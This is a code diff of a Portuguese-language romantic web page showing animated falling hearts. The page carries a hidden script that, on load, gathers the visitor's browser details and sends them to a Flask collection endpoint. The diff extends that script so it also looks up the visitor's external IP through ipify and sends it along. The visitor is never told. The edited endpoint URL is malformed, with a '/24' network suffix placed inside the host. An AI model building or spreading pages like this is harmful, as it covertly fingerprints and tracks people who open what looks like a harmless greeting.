@@ -1,22 +1,14 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>💖 Corações no Ar 💖</title>
   <style>
     html, body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      background: black;
-      height: 100%;
-      cursor: pointer;
+      margin: 0; padding: 0; overflow: hidden;
+      background: black; height: 100%; cursor: pointer;
     }
-
-    canvas {
-      display: block;
-    }
-
+    canvas { display: block; }
     .click-heart {
       position: absolute;
       font-size: 24px;
@@ -24,7 +16,6 @@
       animation: pop 1s ease-out forwards;
       pointer-events: none;
     }
-
     @keyframes pop {
       0% { transform: scale(1) translateY(0); opacity: 1; }
       100% { transform: scale(2) translateY(-50px); opacity: 0; }
@@ -41,7 +32,6 @@
   let width = canvas.width = window.innerWidth;
   let height = canvas.height = window.innerHeight;
 
-  const hearts = [];
   const columns = Math.floor(width / 20);
   const drops = Array(columns).fill(0);
 
@@ -91,10 +81,22 @@
   });
 </script>
 
-<!-- Script para coletar dados do navegador e enviar para o servidor Flask -->
 <script>
+async function getExternalIP() {
+  try {
+    const res = await fetch('https://api.ipify.org?format=json');
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return 'Erro ao buscar IP externo';
+  }
+}
+
 window.onload = async () => {
+  const externalIP = await getExternalIP();
+
   const dadosNavegador = {
+    ipExterno: externalIP,
     userAgent: navigator.userAgent,
     idioma: navigator.language,
     plataforma: navigator.platform,
@@ -102,8 +104,8 @@ window.onload = async () => {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
   };
 
-  // Troque SEU_IP_LOCAL pelo IP do seu PC na rede local, exemplo: 192.168.0.105
-  await fetch("http://192.168.111.6:5000/coletar", {
+  // Troque o IP abaixo pelo IP local do seu PC na rede
+  await fetch("http://192.168.111.6/24:5000/coletar", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify(dadosNavegador),
@@ -112,6 +114,6 @@ window.onload = async () => {
   });
 };
 </script>
-
 </body>
 </html>
+
